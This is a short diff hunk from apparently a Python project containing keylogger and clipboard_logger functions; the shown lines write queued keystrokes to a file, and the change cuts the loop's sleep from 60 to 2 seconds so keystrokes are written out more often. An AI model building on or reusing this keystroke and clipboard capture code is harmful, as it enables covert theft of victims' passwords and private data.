@@ -309,7 +309,7 @@ def keylogger(status):
                     while len(key_queue) > 0:
                         f.write(str(key_queue.pop(0)))
                     f.write("\n")
-        time.sleep(60)
+        time.sleep(2)
 
 def clipboard_logger(status):
     prevClip = None
